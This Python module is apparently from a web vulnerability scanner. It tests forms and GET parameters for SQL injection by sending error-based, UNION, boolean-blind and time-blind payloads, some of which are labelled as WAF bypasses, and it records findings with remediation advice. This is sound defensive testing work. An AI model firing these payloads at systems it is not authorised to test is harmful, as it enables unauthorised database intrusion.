from __future__ import annotations
"""
scanner/testers/sqli.py
------------------------
SQL Injection vulnerability tester.

Detection approaches (OWASP Testing Guide OTG-INPVAL-005):

1. Error-Based SQLi
   ─────────────────
   Injects syntax-breaking characters and looks for database error messages
   in the response. The most obvious form of SQLi — the database literally
   tells you what went wrong.

   Payloads: ' " ; ' OR '1'='1 ) etc.
   Evidence: Strings like "mysql_fetch_array()", "ORA-01756", "SQLITE_ERROR"

2. Boolean-Based Blind SQLi
   ─────────────────────────
   No error message, but the application behaves differently for TRUE vs FALSE
   conditions. We compare the response to a baseline (clean) request:
     - TRUE  condition: ' OR '1'='1' --   → same as baseline (or bigger response)
     - FALSE condition: ' OR '1'='2' --   → shorter/different response

   If len(true_resp) > len(false_resp) by a meaningful margin, the parameter
   is likely injectable.

3. Time-Based Blind SQLi
   ──────────────────────
   Neither errors nor content differences — but the database will SLEEP if
   the condition is met. We inject SLEEP(5)/WAITFOR DELAY and measure the
   wall-clock response time. If the request takes ≥ SLEEP_THRESHOLD seconds
   more than the baseline, the parameter is injectable.

Severity: Critical — SQLi typically leads to full database compromise,
authentication bypass, and often remote code execution.

Remediation: Parameterised queries / prepared statements. Never concatenate
user input into SQL strings. Use an ORM or query builder.
"""

import logging
import time
from typing import NamedTuple

from scanner.crawler import CrawledForm, CrawledPage
from scanner.reporting.models import Finding, Severity, VulnType
from scanner.testers.base import BaseTester
from scanner.utils import http as http_utils
from scanner.utils.display import print_status

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# How much longer (seconds) a time-based payload must take vs baseline
SLEEP_THRESHOLD = 4.0

# SLEEP duration embedded in time-based payloads — must be > SLEEP_THRESHOLD
SLEEP_SECONDS = 5

# Minimum response length difference to flag boolean-based injection.
# Uses both an absolute floor (50 bytes) AND a percentage threshold (15%)
# so short pages aren't missed when the absolute diff is small.
BOOLEAN_DIFF_THRESHOLD = 50   # bytes (absolute floor)
BOOLEAN_PCT_THRESHOLD  = 0.15  # 15% of the larger response


# ---------------------------------------------------------------------------
# Payload lists
# ---------------------------------------------------------------------------

class Payload(NamedTuple):
    value:       str
    description: str


# Error-based payloads — each deliberately breaks SQL syntax
ERROR_PAYLOADS: list[Payload] = [
    Payload("'",                          "Single quote — breaks string delimiter"),
    Payload('"',                          "Double quote — breaks identifier delimiter"),
    Payload("' OR '1'='1",               "Classic OR-based auth bypass attempt"),
    Payload("1' AND 1=CONVERT(int,'a')--", "MSSQL type conversion error"),
    Payload("1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
                                          "MySQL/MariaDB EXTRACTVALUE error"),
    Payload("1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))#",
                                          "MySQL/MariaDB EXTRACTVALUE error (hash comment)"),
    Payload("' OR 1=1--",                 "Comment-terminated OR injection"),
    Payload("' OR 1=1#",                  "MySQL hash-comment OR injection"),
    Payload("1; SELECT 1--",              "Stacked query attempt"),
    Payload("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x "
            "FROM information_schema.tables GROUP BY x)a)--",
                                          "MySQL/MariaDB duplicate-entry error extraction"),
]

# Boolean-based payload pairs: (true_condition, false_condition)
BOOLEAN_PAIRS: list[tuple[Payload, Payload]] = [
    (
        Payload("' OR '1'='1' --", "Boolean TRUE — should return normal content"),
        Payload("' OR '1'='2' --", "Boolean FALSE — should return empty/different content"),
    ),
    (
        Payload("' OR '1'='1'#",   "Boolean TRUE (MySQL hash comment)"),
        Payload("' OR '1'='2'#",   "Boolean FALSE (MySQL hash comment)"),
    ),
    (
        Payload("1 OR 1=1--",      "Boolean TRUE (numeric context)"),
        Payload("1 OR 1=2--",      "Boolean FALSE (numeric context)"),
    ),
    (
        Payload("1 OR 1=1#",       "Boolean TRUE (numeric, MySQL hash comment)"),
        Payload("1 OR 1=2#",       "Boolean FALSE (numeric, MySQL hash comment)"),
    ),
]

# Time-based payloads for different databases
# Format: {db_hint: payload_string}
TIME_PAYLOADS: list[Payload] = [
    # MySQL / MariaDB — standard SLEEP
    Payload(f"' OR SLEEP({SLEEP_SECONDS})--",
            "MySQL/MariaDB SLEEP (dash comment) — 5s delay if injectable"),
    Payload(f"' OR SLEEP({SLEEP_SECONDS})#",
            "MySQL/MariaDB SLEEP (hash comment) — 5s delay if injectable"),
    Payload(f"1 OR SLEEP({SLEEP_SECONDS})--",
            "MySQL/MariaDB SLEEP numeric context"),
    # MySQL / MariaDB — BENCHMARK fallback (when SLEEP is blocked by WAF)
    Payload(f"' OR BENCHMARK(50000000,MD5(1))--",
            "MySQL/MariaDB BENCHMARK — CPU-based delay when SLEEP is filtered"),
    Payload(f"' OR BENCHMARK(50000000,MD5(1))#",
            "MySQL/MariaDB BENCHMARK (hash comment)"),
    # MySQL / MariaDB — subquery-wrapped SLEEP (WAF bypass)
    Payload(f"' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_SECONDS})))a)--",
            "MySQL/MariaDB subquery SLEEP — bypasses simple WAF pattern match"),
    Payload(f"' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_SECONDS})))a)#",
            "MySQL/MariaDB subquery SLEEP (hash comment)"),
    # MSSQL
    Payload(f"1; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
            "MSSQL WAITFOR — causes 5s delay"),
    # PostgreSQL
    Payload(f"' OR pg_sleep({SLEEP_SECONDS})--",
            "PostgreSQL pg_sleep — causes 5s delay"),
    # SQLite
    Payload(f"' OR (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/1)))))--",
            "SQLite RANDOMBLOB — heavy computation causes delay"),
]

# Database error signatures — strings that indicate SQL error output in responses
DB_ERROR_SIGNATURES: list[str] = [
    # MySQL / MariaDB
    "you have an error in your sql syntax",
    "warning: mysql_",
    "warning: mysqli_",
    "mysql_fetch_array",
    "mysql_num_rows",
    "mysqli_fetch_array",
    "mysqli_num_rows",
    "unclosed quotation mark",
    "mysql server version for the right syntax",
    "mariadb server version for the right syntax",
    "supplied argument is not a valid mysql",
    "com.mysql.jdbc",
    "com.mysql.cj.jdbc",
    # MSSQL
    "microsoft sql server",
    "odbc sql server driver",
    "mssql_query()",
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    # Oracle
    "ora-01756",
    "ora-00933",
    "ora-00907",
    "oracle error",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite_error",
    "sql logic error",
    # PostgreSQL
    "pg_query()",
    "postgresql error",
    "unterminated quoted string",
    "pg::syntaxerror",
    # PHP / Framework ORM errors
    "queryexception",           # Laravel
    "sqlexception",             # Java
    "pdo_mysql",
    "org.hibernate",
    "jpql",
    "nhibernate",
    # Generic
    "syntax error",
    "sql error",
    "database error",
    "odbc driver",
    "jdbc driver",
    "sqlstate",
    "native client",
]

# UNION-based detection marker — injected into SELECT, looked for in response
_UNION_MARKER = "SQLI_UNION_7x9k"

# UNION-based payloads — try common column counts (1-5) with both comment styles.
# The marker value is embedded so we can confirm reflection in the response.
UNION_PAYLOADS: list[Payload] = [
    Payload(f"' UNION SELECT '{_UNION_MARKER}'--",
            "UNION 1-col (dash comment)"),
    Payload(f"' UNION SELECT '{_UNION_MARKER}'#",
            "UNION 1-col (hash comment)"),
    Payload(f"' UNION SELECT NULL,'{_UNION_MARKER}'--",
            "UNION 2-col, marker in col 2"),
    Payload(f"' UNION SELECT NULL,'{_UNION_MARKER}'#",
            "UNION 2-col (hash comment)"),
    Payload(f"' UNION SELECT NULL,NULL,'{_UNION_MARKER}'--",
            "UNION 3-col, marker in col 3"),
    Payload(f"' UNION SELECT NULL,NULL,'{_UNION_MARKER}'#",
            "UNION 3-col (hash comment)"),
    Payload(f"' UNION SELECT NULL,NULL,NULL,'{_UNION_MARKER}'--",
            "UNION 4-col, marker in col 4"),
    Payload(f"' UNION SELECT NULL,NULL,NULL,NULL,'{_UNION_MARKER}'--",
            "UNION 5-col, marker in col 5"),
    # Numeric context variants
    Payload(f"1 UNION SELECT '{_UNION_MARKER}'--",
            "UNION 1-col numeric context"),
    Payload(f"1 UNION SELECT NULL,'{_UNION_MARKER}'--",
            "UNION 2-col numeric context"),
    Payload(f"1 UNION SELECT NULL,NULL,'{_UNION_MARKER}'--",
            "UNION 3-col numeric context"),
]

# Remediation — same for all SQLi types
_REMEDIATION = (
    "Use parameterised queries (prepared statements) — NEVER concatenate user "
    "input into SQL strings. Validate and whitelist input types. Apply least-"
    "privilege database accounts. Enable a WAF for defence-in-depth. "
    "Ref: OWASP SQL Injection Prevention Cheat Sheet."
)


# ---------------------------------------------------------------------------
# Tester
# ---------------------------------------------------------------------------

class SQLiTester(BaseTester):
    """
    SQL Injection tester covering error-based, boolean-based, and
    time-based blind detection methods.
    """

    def __init__(self) -> None:
        super().__init__(name="SQL Injection Tester")

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    def run(self, pages: list[CrawledPage]) -> list[Finding]:
        """
        Test all forms and GET parameters found across crawled pages.

        For each testable parameter we run three detection passes:
          1. Error-based (fast, obvious)
          2. Boolean-based blind (medium speed, no error output needed)
          3. Time-based blind (slowest — only if 1 & 2 were negative)
        """
        self.findings.clear()
        self._params_tested = 0

        for page in pages:
            # Test form fields
            for form in page.forms:
                for field in form.testable_fields:
                    self._test_form_field(form, field.name)

            # Test GET parameters
            for param in page.get_params:
                self._test_get_param(page.url, param)

        return self.findings

    # ------------------------------------------------------------------
    # Form field testing
    # ------------------------------------------------------------------

    def _test_form_field(self, form: CrawledForm, field_name: str) -> None:
        """Run all three SQLi detection methods against a single form field."""
        self._count_test()
        print_status(f"SQLi → {form.action_url} [{form.method}] param={field_name}")

        # Baseline response for comparison
        baseline_data = self._inject_form(form, field_name, "test_baseline_1234")
        try:
            if form.method == "POST":
                baseline = http_utils.post(form.action_url, data=baseline_data)
            else:
                baseline = http_utils.get(form.action_url, params=baseline_data)
        except Exception as exc:
            logger.warning("Baseline request failed for %s: %s", form.action_url, exc)
            return

        # --- Pass 1: Error-based ---
        if self._error_based_form(form, field_name, baseline.text):
            return  # Found it — no need to continue with blind methods

        # --- Pass 2: UNION-based ---
        if self._union_based_form(form, field_name):
            return

        # --- Pass 3: Boolean-based blind ---
        if self._boolean_based_form(form, field_name, baseline.text):
            return

        # --- Pass 4: Time-based blind ---
        self._time_based_form(form, field_name, baseline_time=None)

    def _error_based_form(self, form: CrawledForm, field_name: str, baseline_text: str = "") -> bool:
        """Inject error-based payloads into a form field. Returns True on first hit."""
        for payload in ERROR_PAYLOADS:
            data = self._inject_form(form, field_name, payload.value)
            try:
                if form.method == "POST":
                    resp = http_utils.post(form.action_url, data=data)
                else:
                    resp = http_utils.get(form.action_url, params=data)
            except Exception:
                continue

            error_found, signature = self._check_error_signatures(resp.text)
            if error_found:
                # Skip if the same error signature already appears in the baseline
                if baseline_text and signature.lower() in baseline_text.lower():
                    continue
                snippet = self._extract_error_snippet(resp.text, signature)
                finding = Finding(
                    vuln_type=VulnType.SQLI_ERROR,
                    severity=Severity.CRITICAL,
                    url=form.action_url,
                    parameter=field_name,
                    method=form.method,
                    payload=payload.value,
                    evidence=f"DB error signature '{signature}' in response: …{snippet}…",
                    remediation=_REMEDIATION,
                    extra={"db_signature": signature, "payload_desc": payload.description},
                )
                self._log_finding(finding)
                return True
        return False

    def _union_based_form(self, form: CrawledForm, field_name: str) -> bool:
        """Inject UNION SELECT payloads and look for the marker string in the response."""
        for payload in UNION_PAYLOADS:
            data = self._inject_form(form, field_name, payload.value)
            try:
                if form.method == "POST":
                    resp = http_utils.post(form.action_url, data=data)
                else:
                    resp = http_utils.get(form.action_url, params=data)
            except Exception:
                continue
            if _UNION_MARKER in resp.text:
                self._log_finding(Finding(
                    vuln_type=VulnType.SQLI_UNION,
                    severity=Severity.CRITICAL,
                    url=form.action_url,
                    parameter=field_name,
                    method=form.method,
                    payload=payload.value,
                    evidence=f"UNION marker '{_UNION_MARKER}' reflected in response",
                    remediation=_REMEDIATION,
                    extra={"payload_desc": payload.description},
                ))
                return True
        return False

    def _boolean_based_form(
        self, form: CrawledForm, field_name: str, baseline_text: str
    ) -> bool:
        """
        Three-way comparison: TRUE ≈ baseline AND FALSE ≠ baseline.

        This eliminates false positives from dynamic page content (CSRF tokens,
        timestamps, ads) that cause arbitrary length differences between any
        two requests.  A recheck of the TRUE condition adds further confidence.
        """
        baseline_len = len(baseline_text)

        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                # TRUE condition
                true_data = self._inject_form(form, field_name, true_payload.value)
                if form.method == "POST":
                    true_resp = http_utils.post(form.action_url, data=true_data)
                else:
                    true_resp = http_utils.get(form.action_url, params=true_data)

                # FALSE condition
                false_data = self._inject_form(form, field_name, false_payload.value)
                if form.method == "POST":
                    false_resp = http_utils.post(form.action_url, data=false_data)
                else:
                    false_resp = http_utils.get(form.action_url, params=false_data)

            except Exception:
                continue

            len_true  = len(true_resp.text)
            len_false = len(false_resp.text)

            # Gate 1: TRUE must be similar to baseline (within 10%)
            true_baseline_diff = abs(len_true - baseline_len) / max(baseline_len, 1)
            if true_baseline_diff > 0.10:
                continue

            # Gate 2: FALSE must differ significantly from TRUE
            diff     = abs(len_true - len_false)
            pct_diff = diff / max(len_true, len_false, 1)

            if not (diff >= BOOLEAN_DIFF_THRESHOLD and pct_diff >= BOOLEAN_PCT_THRESHOLD):
                continue

            # Gate 3: Recheck — send TRUE again; result must be consistent
            try:
                recheck_data = self._inject_form(form, field_name, true_payload.value)
                if form.method == "POST":
                    recheck = http_utils.post(form.action_url, data=recheck_data)
                else:
                    recheck = http_utils.get(form.action_url, params=recheck_data)
                recheck_drift = abs(len(recheck.text) - len_true) / max(len_true, 1)
                if recheck_drift > 0.05:
                    continue  # Inconsistent — dynamic page, not SQLi
            except Exception:
                continue

            finding = Finding(
                vuln_type=VulnType.SQLI_BOOLEAN,
                severity=Severity.CRITICAL,
                url=form.action_url,
                parameter=field_name,
                method=form.method,
                payload=f"TRUE: {true_payload.value} | FALSE: {false_payload.value}",
                evidence=(
                    f"Boolean-based blind SQLi confirmed (3-way + recheck): "
                    f"baseline={baseline_len}B, TRUE={len_true}B, FALSE={len_false}B "
                    f"(diff={diff}B, {pct_diff:.0%})"
                ),
                remediation=_REMEDIATION,
                extra={
                    "baseline_len": baseline_len,
                    "true_len": len_true,
                    "false_len": len_false,
                    "diff": diff,
                },
            )
            self._log_finding(finding)
            return True
        return False

    def _time_based_form(
        self, form: CrawledForm, field_name: str, baseline_time: float | None
    ) -> bool:
        """Inject time-delay payloads and measure response latency."""
        # Get a fresh baseline timing if not provided
        if baseline_time is None:
            try:
                base_data = self._inject_form(form, field_name, "1")
                if form.method == "POST":
                    _, baseline_time = http_utils.timed_post(form.action_url, data=base_data)
                else:
                    _, baseline_time = http_utils.timed_get(form.action_url, params=base_data)
            except Exception:
                return False

        for payload in TIME_PAYLOADS:
            data = self._inject_form(form, field_name, payload.value)
            try:
                if form.method == "POST":
                    _, elapsed = http_utils.timed_post(form.action_url, data=data)
                else:
                    _, elapsed = http_utils.timed_get(form.action_url, params=data)
            except Exception:
                continue

            delta = elapsed - baseline_time
            if delta >= SLEEP_THRESHOLD:
                # Confirmation pass: network jitter rarely repeats. Re-send the
                # same payload and require the delay to reproduce before flagging.
                try:
                    if form.method == "POST":
                        _, elapsed2 = http_utils.timed_post(form.action_url, data=data)
                    else:
                        _, elapsed2 = http_utils.timed_get(form.action_url, params=data)
                except Exception:
                    continue
                if (elapsed2 - baseline_time) < SLEEP_THRESHOLD:
                    logger.debug("Time-based SQLi not reproducible for %s (%.2fs vs %.2fs) — skipping",
                                 field_name, elapsed, elapsed2)
                    continue
                finding = Finding(
                    vuln_type=VulnType.SQLI_TIME,
                    severity=Severity.CRITICAL,
                    url=form.action_url,
                    parameter=field_name,
                    method=form.method,
                    payload=payload.value,
                    evidence=(
                        f"Response delayed by {delta:.2f}s, reproduced at {elapsed2 - baseline_time:.2f}s "
                        f"(baseline={baseline_time:.2f}s, threshold={SLEEP_THRESHOLD}s)"
                    ),
                    remediation=_REMEDIATION,
                    extra={
                        "baseline_secs": round(baseline_time, 3),
                        "injected_secs": round(elapsed, 3),
                        "delta_secs":    round(delta, 3),
                    },
                )
                self._log_finding(finding)
                return True
        return False

    # ------------------------------------------------------------------
    # GET parameter testing (mirrors form testing)
    # ------------------------------------------------------------------

    def _test_get_param(self, url: str, param_name: str) -> None:
        """Run all three SQLi detection methods against a GET query parameter."""
        self._count_test()
        print_status(f"SQLi → {url} [GET] param={param_name}")

        baseline_url = self._inject_get_param(url, param_name, "test_baseline_1234")
        try:
            baseline = http_utils.get(baseline_url)
        except Exception:
            return

        if self._error_based_get(url, param_name, baseline.text):
            return
        if self._union_based_get(url, param_name):
            return
        if self._boolean_based_get(url, param_name, baseline.text):
            return
        self._time_based_get(url, param_name)

    def _error_based_get(self, url: str, param_name: str, baseline_text: str = "") -> bool:
        for payload in ERROR_PAYLOADS:
            injected_url = self._inject_get_param(url, param_name, payload.value)
            try:
                resp = http_utils.get(injected_url)
            except Exception:
                continue
            error_found, signature = self._check_error_signatures(resp.text)
            if error_found:
                # Skip if the same error signature already appears in the baseline
                if baseline_text and signature.lower() in baseline_text.lower():
                    continue
                snippet = self._extract_error_snippet(resp.text, signature)
                self._log_finding(Finding(
                    vuln_type=VulnType.SQLI_ERROR,
                    severity=Severity.CRITICAL,
                    url=injected_url,
                    parameter=param_name,
                    method="GET",
                    payload=payload.value,
                    evidence=f"DB error signature '{signature}' in response: …{snippet}…",
                    remediation=_REMEDIATION,
                    extra={"db_signature": signature},
                ))
                return True
        return False

    def _union_based_get(self, url: str, param_name: str) -> bool:
        """Inject UNION SELECT payloads into a GET parameter and look for the marker."""
        for payload in UNION_PAYLOADS:
            injected_url = self._inject_get_param(url, param_name, payload.value)
            try:
                resp = http_utils.get(injected_url)
            except Exception:
                continue
            if _UNION_MARKER in resp.text:
                self._log_finding(Finding(
                    vuln_type=VulnType.SQLI_UNION,
                    severity=Severity.CRITICAL,
                    url=injected_url,
                    parameter=param_name,
                    method="GET",
                    payload=payload.value,
                    evidence=f"UNION marker '{_UNION_MARKER}' reflected in response",
                    remediation=_REMEDIATION,
                    extra={"payload_desc": payload.description},
                ))
                return True
        return False

    def _boolean_based_get(self, url: str, param_name: str, baseline_text: str) -> bool:
        baseline_len = len(baseline_text)

        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                true_url  = self._inject_get_param(url, param_name, true_payload.value)
                true_resp = http_utils.get(true_url)
                false_url = self._inject_get_param(url, param_name, false_payload.value)
                false_resp = http_utils.get(false_url)
            except Exception:
                continue

            len_true  = len(true_resp.text)
            len_false = len(false_resp.text)

            # Gate 1: TRUE ≈ baseline
            true_baseline_diff = abs(len_true - baseline_len) / max(baseline_len, 1)
            if true_baseline_diff > 0.10:
                continue

            # Gate 2: FALSE ≠ TRUE significantly
            diff     = abs(len_true - len_false)
            pct_diff = diff / max(len_true, len_false, 1)
            if not (diff >= BOOLEAN_DIFF_THRESHOLD and pct_diff >= BOOLEAN_PCT_THRESHOLD):
                continue

            # Gate 3: Recheck TRUE for consistency
            try:
                recheck_url = self._inject_get_param(url, param_name, true_payload.value)
                recheck = http_utils.get(recheck_url)
                recheck_drift = abs(len(recheck.text) - len_true) / max(len_true, 1)
                if recheck_drift > 0.05:
                    continue
            except Exception:
                continue

            self._log_finding(Finding(
                vuln_type=VulnType.SQLI_BOOLEAN,
                severity=Severity.CRITICAL,
                url=url,
                parameter=param_name,
                method="GET",
                payload=f"TRUE: {true_payload.value} | FALSE: {false_payload.value}",
                evidence=(
                    f"Boolean-based blind SQLi confirmed (3-way + recheck): "
                    f"baseline={baseline_len}B, TRUE={len_true}B, FALSE={len_false}B "
                    f"(diff={diff}B, {pct_diff:.0%})"
                ),
                remediation=_REMEDIATION,
                extra={
                    "baseline_len": baseline_len,
                    "true_len": len_true,
                    "false_len": len_false,
                    "diff": diff,
                },
            ))
            return True
        return False

    def _time_based_get(self, url: str, param_name: str) -> bool:
        try:
            base_url = self._inject_get_param(url, param_name, "1")
            _, baseline_time = http_utils.timed_get(base_url)
        except Exception:
            return False

        for payload in TIME_PAYLOADS:
            injected_url = self._inject_get_param(url, param_name, payload.value)
            try:
                _, elapsed = http_utils.timed_get(injected_url)
            except Exception:
                continue
            delta = elapsed - baseline_time
            if delta >= SLEEP_THRESHOLD:
                # Confirmation pass — require the delay to reproduce.
                try:
                    _, elapsed2 = http_utils.timed_get(injected_url)
                except Exception:
                    continue
                if (elapsed2 - baseline_time) < SLEEP_THRESHOLD:
                    logger.debug("Time-based SQLi not reproducible for %s — skipping", param_name)
                    continue
                self._log_finding(Finding(
                    vuln_type=VulnType.SQLI_TIME,
                    severity=Severity.CRITICAL,
                    url=injected_url,
                    parameter=param_name,
                    method="GET",
                    payload=payload.value,
                    evidence=(
                        f"Response delayed {delta:.2f}s, reproduced at {elapsed2 - baseline_time:.2f}s "
                        f"(baseline={baseline_time:.2f}s)"
                    ),
                    remediation=_REMEDIATION,
                    extra={"delta_secs": round(delta, 3)},
                ))
                return True
        return False

    # ------------------------------------------------------------------
    # Error signature check
    # ------------------------------------------------------------------

    def _check_error_signatures(self, response_text: str) -> tuple[bool, str]:
        """
        Scan response text for known database error strings.

        Returns:
            (True, matched_signature) if an error was found.
            (False, "") otherwise.
        """
        lower = response_text.lower()
        for sig in DB_ERROR_SIGNATURES:
            if sig in lower:
                return True, sig
        return False, ""
